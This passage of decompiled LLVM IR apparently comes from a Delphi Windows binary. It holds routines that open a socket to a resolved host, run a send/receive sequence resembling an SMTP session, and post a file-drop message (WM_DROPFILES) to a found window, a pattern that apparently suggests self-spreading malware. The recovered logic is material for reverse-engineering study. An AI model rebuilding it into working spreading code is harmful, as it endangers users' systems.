  store i32 %113, i32* %115, align 4, !insn.addr !892
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !893
  %117 = load i32, i32* %21, align 4, !insn.addr !894
  %118 = add i32 %esp.0.reload, -20, !insn.addr !894
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !894
  %120 = call i32 @"@LStrCatN"(), !insn.addr !895
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !896
  %122 = load i32, i32* %23, align 4, !insn.addr !897
  %123 = add i32 %122, -1, !insn.addr !897
  %124 = icmp eq i32 %123, 0, !insn.addr !897
  store i32 %123, i32* %23, align 4, !insn.addr !897
  %125 = icmp eq i1 %124, false, !insn.addr !898
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !898
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !898
  br i1 %125, label %dec_label_pc_40543e, label %dec_label_pc_4055dd, !insn.addr !898

dec_label_pc_4055dd:                              ; preds = %dec_label_pc_405589
  %126 = load i32, i32* %119, align 4, !insn.addr !899
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !900
  store i32 4216319, i32* %111, align 4, !insn.addr !901
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !902
  ret i32 %127, !insn.addr !903
}

define i32 @function_4055f8() local_unnamed_addr {
dec_label_pc_4055f8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !904
  ret i32 %0, !insn.addr !904
}

define i32 @function_4055fd() local_unnamed_addr {
dec_label_pc_4055fd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !905
}

define i32 @function_4055ff(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4055ff:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !906
}

define i32 @function_405608() local_unnamed_addr {
dec_label_pc_405608:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !907
  %0 = call i32 @function_4036c8(), !insn.addr !908
  %1 = inttoptr i32 %0 to i8*, !insn.addr !909
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !910
  %3 = call i32 @"@FillChar"(), !insn.addr !911
  %4 = icmp eq %hostent* %2, null, !insn.addr !912
  br i1 %4, label %dec_label_pc_405653, label %dec_label_pc_405631, !insn.addr !913

dec_label_pc_405631:                              ; preds = %dec_label_pc_405608
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !910
  %6 = add i32 %5, 12, !insn.addr !914
  %7 = inttoptr i32 %6 to i32*, !insn.addr !914
  %8 = load i32, i32* %7, align 4, !insn.addr !914
  %9 = inttoptr i32 %8 to i32*, !insn.addr !915
  %10 = load i32, i32* %9, align 4, !insn.addr !915
  %11 = inttoptr i32 %10 to i8*, !insn.addr !916
  %12 = load i8, i8* %11, align 1, !insn.addr !916
  %13 = sext i8 %12 to i32, !insn.addr !917
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !918
  br label %dec_label_pc_405653, !insn.addr !918

dec_label_pc_405653:                              ; preds = %dec_label_pc_405631, %dec_label_pc_405608
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !919
}

define i32 @function_405664() local_unnamed_addr {
dec_label_pc_405664:
  %esp.0.reg2mem = alloca i32, !insn.addr !920
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !921
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !922
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !922
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !922
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !923
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !924
  %5 = trunc i32 %4 to i16, !insn.addr !924
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !925
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !926
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !926
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !927
  %9 = icmp eq i32 %8, -1, !insn.addr !928
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !929
  br i1 %9, label %dec_label_pc_4056f2, label %dec_label_pc_4056b3, !insn.addr !929

dec_label_pc_4056b3:                              ; preds = %dec_label_pc_405664
  %10 = call i32 @function_405608(), !insn.addr !930
  %11 = trunc i32 %10 to i16, !insn.addr !931
  %12 = call i16 @htons(i16 %11), !insn.addr !931
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !932
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !932
  %14 = sext i16 %12 to i32, !insn.addr !933
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !933
  %16 = icmp eq i32 %15, 0, !insn.addr !934
  %17 = icmp eq i1 %16, false, !insn.addr !935
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !935
  br i1 %17, label %dec_label_pc_4056f2, label %dec_label_pc_4056ea, !insn.addr !935

dec_label_pc_4056ea:                              ; preds = %dec_label_pc_4056b3
  %18 = inttoptr i32 %0 to i32*, !insn.addr !936
  store i32 %8, i32* %18, align 4, !insn.addr !936
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !937
  br label %dec_label_pc_4056f2, !insn.addr !937

dec_label_pc_4056f2:                              ; preds = %dec_label_pc_4056ea, %dec_label_pc_4056b3, %dec_label_pc_405664
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !938
  %20 = load i32, i32* %19, align 4, !insn.addr !938
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !939
  %21 = add i32 %esp.0.reload, 8, !insn.addr !940
  %22 = inttoptr i32 %21 to i32*, !insn.addr !940
  store i32 4216591, i32* %22, align 4, !insn.addr !940
  %23 = call i32 @"@LStrClr"(), !insn.addr !941
  ret i32 %23, !insn.addr !942
}

define i32 @function_405708() local_unnamed_addr {
dec_label_pc_405708:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !943
  ret i32 %0, !insn.addr !943
}

define i32 @function_40570d() local_unnamed_addr {
dec_label_pc_40570d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !944
}

define i32 @function_40570f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40570f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !945
}

define i32 @function_405718() local_unnamed_addr {
dec_label_pc_405718:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !946
  %2 = call i32 @WSACleanup(), !insn.addr !947
  ret i32 %2, !insn.addr !948
}

define i32 @function_405724() local_unnamed_addr {
dec_label_pc_405724:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !949
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !950
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !950
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !950
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !951
  %4 = call i32 @function_4036c8(), !insn.addr !952
  %5 = call i32 @StrCopy(), !insn.addr !953
  %6 = call i32 @function_406f48(i32 4), !insn.addr !954
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !955
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !956
  %9 = call i32 @"@LStrClr"(), !insn.addr !957
  ret i32 %9, !insn.addr !958
}

define i32 @function_405795() local_unnamed_addr {
dec_label_pc_405795:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !959
  ret i32 %0, !insn.addr !959
}

define i32 @function_40579a() local_unnamed_addr {
dec_label_pc_40579a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !960
}

define i32 @function_40579c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40579c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !961
}

define i32 @function_4057a4() local_unnamed_addr {
dec_label_pc_4057a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !962
  %2 = call i32 @StrPas(), !insn.addr !963
  ret i32 %2, !insn.addr !964
}

define i32 @function_4057d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4057d0:
  %esp.1.reg2mem = alloca i32, !insn.addr !965
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !965
  %esp.0.reg2mem = alloca i32, !insn.addr !965
  %ecx.0.reg2mem = alloca i32, !insn.addr !965
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !966
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !967
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !967
  br label %dec_label_pc_4057d9, !insn.addr !967

dec_label_pc_4057d9:                              ; preds = %dec_label_pc_4057d9, %dec_label_pc_4057d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !968
  %2 = inttoptr i32 %1 to i32*, !insn.addr !968
  store i32 0, i32* %2, align 4, !insn.addr !968
  %3 = add i32 %esp.0.reload, -8, !insn.addr !969
  %4 = inttoptr i32 %3 to i32*, !insn.addr !969
  store i32 0, i32* %4, align 4, !insn.addr !969
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !970
  %6 = icmp eq i32 %5, 0, !insn.addr !970
  %7 = icmp eq i1 %6, false, !insn.addr !971
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !971
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !971
  br i1 %7, label %dec_label_pc_4057d9, label %dec_label_pc_4057e0, !insn.addr !971

dec_label_pc_4057e0:                              ; preds = %dec_label_pc_4057d9
  %8 = add i32 %esp.0.reload, -12, !insn.addr !972
  %9 = inttoptr i32 %8 to i32*, !insn.addr !972
  store i32 0, i32* %9, align 4, !insn.addr !972
  %10 = call i32 @function_4036b8(), !insn.addr !973
  %11 = call i32 @function_4036b8(), !insn.addr !974
  %12 = call i32 @function_4036b8(), !insn.addr !975
  %13 = call i32 @function_4036b8(), !insn.addr !976
  %14 = call i32 @function_4036b8(), !insn.addr !977
  %15 = call i32 @function_4036b8(), !insn.addr !978
  %16 = call i32 @function_4036b8(), !insn.addr !979
  %17 = add i32 %esp.0.reload, -20, !insn.addr !980
  %18 = inttoptr i32 %17 to i32*, !insn.addr !980
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !980
  store i32 %19, i32* %18, align 4, !insn.addr !980
  %20 = add i32 %esp.0.reload, -24, !insn.addr !981
  %21 = inttoptr i32 %20 to i32*, !insn.addr !981
  store i32 4217413, i32* %21, align 4, !insn.addr !981
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !982
  %23 = add i32 %esp.0.reload, -28, !insn.addr !982
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !982
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !983
  %25 = call i32 @function_405664(), !insn.addr !984
  %26 = icmp eq i32 %25, 0, !insn.addr !985
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !986
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !986
  br i1 %26, label %dec_label_pc_405a10, label %dec_label_pc_40584e, !insn.addr !986

dec_label_pc_40584e:                              ; preds = %dec_label_pc_4057e0
  %27 = add i32 %esp.0.reload, -32, !insn.addr !987
  %28 = inttoptr i32 %27 to i32*, !insn.addr !987
  store i32 ptrtoint ([6 x i8]* @global_var_405a60 to i32), i32* %28, align 4, !insn.addr !987
  %29 = add i32 %esp.0.reload, -36, !insn.addr !988
  %30 = inttoptr i32 %29 to i32*, !insn.addr !988
  %31 = add i32 %esp.0.reload, -40, !insn.addr !989
  %32 = inttoptr i32 %31 to i32*, !insn.addr !989
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %32, align 4, !insn.addr !989
  %33 = call i32 @"@LStrCatN"(), !insn.addr !990
  %34 = call i32 @function_405724(), !insn.addr !991
  %35 = call i32 @function_4057a4(), !insn.addr !992
  %36 = call i32 @function_405724(), !insn.addr !993
  %37 = call i32 @function_4057a4(), !insn.addr !994
  %38 = call i32 @"@LStrCat"(), !insn.addr !995
  %39 = call i32 @function_405724(), !insn.addr !996
  %40 = call i32 @function_4057a4(), !insn.addr !997
  %41 = call i32 @"@LStrCat"(), !insn.addr !998
  %42 = call i32 @function_405724(), !insn.addr !999
  %43 = call i32 @function_4057a4(), !insn.addr !1000
  %44 = add i32 %esp.0.reload, -44, !insn.addr !1001
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1001
  store i32 ptrtoint ([13 x i8]* @global_var_405a94 to i32), i32* %45, align 4, !insn.addr !1001
  %46 = add i32 %esp.0.reload, -48, !insn.addr !1002
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1002
  store i32 %arg1, i32* %47, align 4, !insn.addr !1002
  %48 = add i32 %esp.0.reload, -52, !insn.addr !1003
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1003
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %49, align 4, !insn.addr !1003
  %50 = add i32 %esp.0.reload, -56, !insn.addr !1004
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1004
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %51, align 4, !insn.addr !1004
  %52 = call i32 @"@LStrCatN"(), !insn.addr !1005
  %53 = call i32 @function_405724(), !insn.addr !1006
  %54 = call i32 @function_4057a4(), !insn.addr !1007
  %55 = add i32 %esp.0.reload, -60, !insn.addr !1008
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1008
  store i32 ptrtoint ([11 x i8]* @global_var_405ab8 to i32), i32* %56, align 4, !insn.addr !1008
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1009
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1009
  store i32 %arg2, i32* %58, align 4, !insn.addr !1009
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1010
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1010
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %60, align 4, !insn.addr !1010
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1011
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1011
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %62, align 4, !insn.addr !1011
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1012
  %64 = call i32 @function_405724(), !insn.addr !1013
  %65 = call i32 @function_4057a4(), !insn.addr !1014
  %66 = call i32 @function_405724(), !insn.addr !1015
  %67 = call i32 @function_4057a4(), !insn.addr !1016
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1017
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1017
  store i32 ptrtoint ([8 x i8]* @global_var_405adc to i32), i32* %69, align 4, !insn.addr !1017
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1018
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1018
  store i32 %arg1, i32* %71, align 4, !insn.addr !1018
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1019
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1019
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %73, align 4, !insn.addr !1019
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1020
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1020
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %75, align 4, !insn.addr !1020
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1021
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1021
  store i32 ptrtoint ([6 x i8]* @global_var_405aec to i32), i32* %77, align 4, !insn.addr !1021
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1022
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1022
  store i32 %arg2, i32* %79, align 4, !insn.addr !1022
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1023
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1023
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %81, align 4, !insn.addr !1023
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1024
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1024
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %83, align 4, !insn.addr !1024
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1025
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1025
  store i32 ptrtoint ([10 x i8]* @global_var_405afc to i32), i32* %85, align 4, !insn.addr !1025
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1026
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1026
  store i32 %arg3, i32* %87, align 4, !insn.addr !1026
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1027
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1027
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %89, align 4, !insn.addr !1027
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1028
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1028
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %91, align 4, !insn.addr !1028
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1029
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1029
  store i32 %arg4, i32* %93, align 4, !insn.addr !1029
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1030
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1030
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %95, align 4, !insn.addr !1030
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1031
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1031
  store i32 ptrtoint (i32* @global_var_405b10 to i32), i32* %97, align 4, !insn.addr !1031
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1032
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %99, align 4, !insn.addr !1032
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1033
  %101 = call i32 @function_405724(), !insn.addr !1034
  %102 = call i32 @function_4057a4(), !insn.addr !1035
  %103 = call i32 @function_405724(), !insn.addr !1036
  %104 = call i32 @function_4057a4(), !insn.addr !1037
  %105 = call i32 @function_405718(), !insn.addr !1038
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1039
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1039
  br label %dec_label_pc_405a10, !insn.addr !1039

dec_label_pc_405a10:                              ; preds = %dec_label_pc_40584e, %dec_label_pc_4057e0
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1040
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1040
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1041
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1042
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1043
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1043
  store i32 4217420, i32* %110, align 4, !insn.addr !1043
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1044
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1045
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1046
  ret i32 %113, !insn.addr !1047
}

define i32 @function_405a45() local_unnamed_addr {
dec_label_pc_405a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1048
  ret i32 %0, !insn.addr !1048
}

define i32 @function_405a4a() local_unnamed_addr {
dec_label_pc_405a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1049
}

define i32 @function_405a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1050
}

define i32 @function_405b17() local_unnamed_addr {
dec_label_pc_405b17:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1051
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1051
  store i32 %3, i32* %4, align 4, !insn.addr !1051
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1052
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1052
  %9 = add i8 %6, %8, !insn.addr !1052
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1052
  store i8 %9, i8* %10, align 1, !insn.addr !1052
  %11 = add i32 %2, 85, !insn.addr !1053
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1053
  %13 = load i8, i8* %12, align 1, !insn.addr !1053
  %14 = trunc i32 %1 to i8, !insn.addr !1053
  %15 = add i8 %13, %14, !insn.addr !1053
  store i8 %15, i8* %12, align 1, !insn.addr !1053
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1054
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1054
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1054
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1055
  %18 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1056
  %19 = add i32 %18, 1, !insn.addr !1056
  %20 = icmp eq i32 %19, 0, !insn.addr !1056
  store i32 %19, i32* @global_var_4096b4, align 4, !insn.addr !1056
  %21 = icmp eq i1 %20, false, !insn.addr !1057
  br i1 %21, label %dec_label_pc_405b51, label %dec_label_pc_405b3d, !insn.addr !1057

dec_label_pc_405b3d:                              ; preds = %dec_label_pc_405b17
  %22 = call i32 @"@LStrClr"(), !insn.addr !1058
  %23 = call i32 @"@LStrClr"(), !insn.addr !1059
  br label %dec_label_pc_405b51, !insn.addr !1059

dec_label_pc_405b51:                              ; preds = %dec_label_pc_405b3d, %dec_label_pc_405b17
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1060
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1061
  ret i32 0, !insn.addr !1062
}

define i32 @function_405b5f() local_unnamed_addr {
dec_label_pc_405b5f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1063
  ret i32 %0, !insn.addr !1063
}

define i32 @function_405b64() local_unnamed_addr {
dec_label_pc_405b64:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1064
}

define i32 @function_405b66(i32 %arg1) local_unnamed_addr {
dec_label_pc_405b66:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1065
}

define i32 @function_405b68() local_unnamed_addr {
dec_label_pc_405b68:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1066
  %2 = add i32 %1, -1, !insn.addr !1066
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !1066
  ret i32 %0, !insn.addr !1067
}

define i32 @function_405b70() local_unnamed_addr {
dec_label_pc_405b70:
  %esp.0.reg2mem = alloca i32, !insn.addr !1068
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1069
  %2 = icmp eq i32 %0, 0, !insn.addr !1070
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1071
  br i1 %2, label %dec_label_pc_405c7a, label %dec_label_pc_405b8a, !insn.addr !1071

dec_label_pc_405b8a:                              ; preds = %dec_label_pc_405b70
  %3 = call i32 @function_4036c8(), !insn.addr !1072
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1073
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1073
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1073
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1074
  %7 = icmp eq i1 %6, false, !insn.addr !1075
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1076
  br i1 %7, label %dec_label_pc_405c7a, label %dec_label_pc_405ba5, !insn.addr !1076

dec_label_pc_405ba5:                              ; preds = %dec_label_pc_405b8a
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_405c88 to i32*), i8* null, i8* %8), !insn.addr !1077
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1077
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1078
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1078
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1079
  %13 = icmp eq i1 %12, false, !insn.addr !1080
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1081
  br i1 %13, label %dec_label_pc_405c7a, label %dec_label_pc_405bce, !insn.addr !1081

dec_label_pc_405bce:                              ; preds = %dec_label_pc_405ba5
  %14 = call i32 @function_4034c8(), !insn.addr !1082
  %15 = add i32 %14, 22, !insn.addr !1083
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1084
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1084
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1085
  %18 = icmp eq i32* %17, null, !insn.addr !1086
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1087
  br i1 %18, label %dec_label_pc_405c7a, label %dec_label_pc_405bed, !insn.addr !1087

dec_label_pc_405bed:                              ; preds = %dec_label_pc_405bce
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1088
  %20 = icmp eq i32* %19, null, !insn.addr !1089
  %21 = icmp eq i1 %20, false, !insn.addr !1090
  br i1 %21, label %dec_label_pc_405c01, label %dec_label_pc_405bf9, !insn.addr !1090

dec_label_pc_405bf9:                              ; preds = %dec_label_pc_405bed
  %22 = bitcast i32* %17 to i8*, !insn.addr !1091
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1091
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1091
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1092
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1093
  br label %dec_label_pc_405c7a, !insn.addr !1093

dec_label_pc_405c01:                              ; preds = %dec_label_pc_405bed
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1085
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1088
  store i32 20, i32* %19, align 4, !insn.addr !1094
  %27 = add i32 %26, 4, !insn.addr !1095
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1095
  store i32 0, i32* %28, align 4, !insn.addr !1095
  %29 = add i32 %26, 8, !insn.addr !1096
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1096
  store i32 0, i32* %30, align 4, !insn.addr !1096
  %31 = add i32 %26, 12, !insn.addr !1097
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1097
  store i32 0, i32* %32, align 4, !insn.addr !1097
  %33 = add i32 %26, 16, !insn.addr !1098
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1098
  store i32 0, i32* %34, align 4, !insn.addr !1098
  %35 = call i32 @function_4036c8(), !insn.addr !1099
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1100
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1100
  %37 = add i32 %26, 20, !insn.addr !1101
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1102
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1103
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1104
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1105
  %42 = call i32 @function_406ea8(i32 4218000, i32 2000, i32 -1), !insn.addr !1106
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1107
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1107
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1108
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1108
  %46 = icmp eq i1 %45, false, !insn.addr !1109
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1110
  br i1 %46, label %dec_label_pc_405c7a, label %dec_label_pc_405c6b, !insn.addr !1110

